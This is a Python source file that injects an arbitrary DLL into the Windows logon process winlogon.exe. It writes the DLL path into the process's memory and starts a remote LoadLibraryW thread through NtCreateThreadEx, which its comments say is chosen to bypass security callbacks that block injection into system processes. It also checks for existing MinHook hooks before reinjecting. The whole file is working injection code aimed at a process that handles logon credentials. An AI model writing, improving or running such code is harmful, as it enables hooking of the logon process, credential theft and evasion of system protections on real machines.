import ctypes
import ctypes.wintypes
import psutil
import os
import time
import logging
import struct

kernel32 = ctypes.windll.kernel32
ntdll    = ctypes.windll.ntdll

# Bug #6 fix: set correct restype for functions that return pointers/handles.
kernel32.OpenProcess.restype  = ctypes.c_void_p
kernel32.OpenProcess.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD]

kernel32.VirtualAllocEx.restype  = ctypes.c_void_p
kernel32.VirtualAllocEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
                                     ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]

kernel32.VirtualFreeEx.restype  = ctypes.wintypes.BOOL
kernel32.VirtualFreeEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.wintypes.DWORD]

kernel32.WriteProcessMemory.restype  = ctypes.wintypes.BOOL
kernel32.WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                                         ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]

kernel32.ReadProcessMemory.restype  = ctypes.wintypes.BOOL
kernel32.ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                                        ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]

kernel32.GetModuleHandleW.restype  = ctypes.c_void_p
kernel32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]

kernel32.GetProcAddress.restype  = ctypes.c_void_p
kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

kernel32.WaitForSingleObject.restype  = ctypes.wintypes.DWORD
kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.wintypes.DWORD]

kernel32.GetExitCodeThread.restype  = ctypes.wintypes.BOOL
kernel32.GetExitCodeThread.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.wintypes.DWORD)]

kernel32.CloseHandle.restype  = ctypes.wintypes.BOOL
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

# NtCreateThreadEx — lower-level thread creation used by third-party injectors.
# Unlike CreateRemoteThread, it does NOT trigger the Win32 security callbacks
# (PsSetCreateThreadNotifyRoutine consumers / csrss registration) that can
# silently block injection into system processes such as winlogon.exe.
ntdll.NtCreateThreadEx.restype  = ctypes.c_long   # NTSTATUS
ntdll.NtCreateThreadEx.argtypes = [
    ctypes.POINTER(ctypes.c_void_p),  # ThreadHandle (out)
    ctypes.wintypes.DWORD,             # DesiredAccess
    ctypes.c_void_p,                   # ObjectAttributes (NULL)
    ctypes.c_void_p,                   # ProcessHandle
    ctypes.c_void_p,                   # StartRoutine (LoadLibraryW)
    ctypes.c_void_p,                   # Argument (dll path ptr)
    ctypes.wintypes.ULONG,             # CreateFlags (0 = run immediately)
    ctypes.c_size_t,                   # ZeroBits
    ctypes.c_size_t,                   # StackSize
    ctypes.c_size_t,                   # MaximumStackSize
    ctypes.c_void_p,                   # AttributeList (NULL)
]

PROCESS_ALL_ACCESS = 0x1F0FFF
THREAD_ALL_ACCESS  = 0x1FFFFF
MEM_COMMIT   = 0x00001000
MEM_RESERVE  = 0x00002000
MEM_RELEASE  = 0x00008000
PAGE_READWRITE        = 0x04
PAGE_EXECUTE_READWRITE = 0x40


def get_pid(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
            return proc.info['pid']
    return None


def is_dll_injected(pid: int, dll_name: str) -> bool:
    """
    Bug #7 fix: check whether a DLL is already loaded in the target process
    before injecting, preventing duplicate initialization of MinHook hooks.
    """
    try:
        proc = psutil.Process(pid)
        dll_name_lower = dll_name.lower()
        for m in proc.memory_maps():
            if dll_name_lower in m.path.lower():
                return True
    except Exception:
        pass
    return False


def inject_dll(pid, dll_path):
    if not os.path.exists(dll_path):
        logging.error(f"inject_dll: DLL not found at path: {dll_path}")
        return False

    # ── 1. Open target process ────────────────────────────────────────────────
    dll_path_bytes = (dll_path + '\0').encode('utf-16-le')
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        err = ctypes.get_last_error()
        logging.error(f"inject_dll: OpenProcess(pid={pid}) failed. LastError={err}")
        return False

    # ── 2. Write DLL path into target ─────────────────────────────────────────
    arg_address = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes),
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not arg_address:
        err = ctypes.get_last_error()
        logging.error(f"inject_dll: VirtualAllocEx(path) failed. LastError={err}")
        kernel32.CloseHandle(h_process)
        return False

    written = ctypes.c_size_t(0)
    ok = kernel32.WriteProcessMemory(h_process, arg_address, dll_path_bytes,
                                     len(dll_path_bytes), ctypes.byref(written))
    if not ok or written.value != len(dll_path_bytes):
        err = ctypes.get_last_error()
        logging.error(f"inject_dll: WriteProcessMemory failed ({written.value}/{len(dll_path_bytes)} bytes). LastError={err}")
        kernel32.VirtualFreeEx(h_process, arg_address, 0, MEM_RELEASE)
        kernel32.CloseHandle(h_process)
        return False

    # ── 3. Resolve LoadLibraryW address ───────────────────────────────────────
    h_kernel32  = kernel32.GetModuleHandleW("kernel32.dll")
    h_loadlib   = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryW")
    if not h_loadlib:
        logging.error("inject_dll: GetProcAddress(LoadLibraryW) returned NULL")
        kernel32.VirtualFreeEx(h_process, arg_address, 0, MEM_RELEASE)
        kernel32.CloseHandle(h_process)
        return False

    # ── 4. NtCreateThreadEx (bypasses Win32 security callbacks) ───────────────
    h_thread = ctypes.c_void_p(0)
    status = ntdll.NtCreateThreadEx(
        ctypes.byref(h_thread),
        THREAD_ALL_ACCESS,   # DesiredAccess
        None,                # ObjectAttributes
        h_process,           # ProcessHandle
        h_loadlib,           # StartRoutine = LoadLibraryW
        arg_address,         # Argument     = dll path
        0,                   # CreateFlags  = 0 (run immediately, not suspended)
        0, 0, 0,             # ZeroBits, StackSize, MaximumStackSize
        None,                # AttributeList
    )
    if status != 0 or not h_thread.value:
        logging.error(f"inject_dll: NtCreateThreadEx failed. NTSTATUS={status:#010x}")
        kernel32.VirtualFreeEx(h_process, arg_address, 0, MEM_RELEASE)
        kernel32.CloseHandle(h_process)
        return False

    # ── 5. Wait and check LoadLibraryW result ─────────────────────────────────
    wait_result = kernel32.WaitForSingleObject(h_thread.value, 8000)
    if wait_result != 0:
        logging.warning(f"inject_dll: WaitForSingleObject returned {wait_result:#x} (timeout or error)")

    exit_code = ctypes.wintypes.DWORD(0)
    kernel32.GetExitCodeThread(h_thread.value, ctypes.byref(exit_code))

    kernel32.CloseHandle(h_thread.value)
    kernel32.VirtualFreeEx(h_process, arg_address, 0, MEM_RELEASE)
    kernel32.CloseHandle(h_process)

    if exit_code.value == 0:
        logging.error(
            "inject_dll: LoadLibraryW returned NULL — DLL failed to load. "
            "Possible causes: missing dependency, AV/WDAC block, corrupt DLL, "
            "or wrong architecture. Check the DLL with 'dumpbin /dependents'."
        )
        return False

    logging.info(f"inject_dll: LoadLibraryW returned HMODULE={exit_code.value:#x} — DLL loaded OK.")
    return True


def ensure_injected(dll_path):
    pid = get_pid("winlogon.exe")
    if not pid:
        logging.warning("ensure_injected: winlogon.exe not found, skipping injection.")
        return

    dll_basename = os.path.basename(dll_path).lower()
    if is_dll_injected(pid, dll_basename):
        logging.debug(f"ensure_injected: {dll_basename} already present in winlogon.exe (pid={pid}), skipping.")
        return

    logging.info(f"ensure_injected: Injecting {dll_basename} into winlogon.exe (pid={pid})...")
    success = inject_dll(pid, dll_path)
    if success:
        logging.info(f"ensure_injected: Injection of {dll_basename} succeeded (pid={pid}).")
    else:
        logging.error(f"ensure_injected: Injection of {dll_basename} FAILED (pid={pid}).")
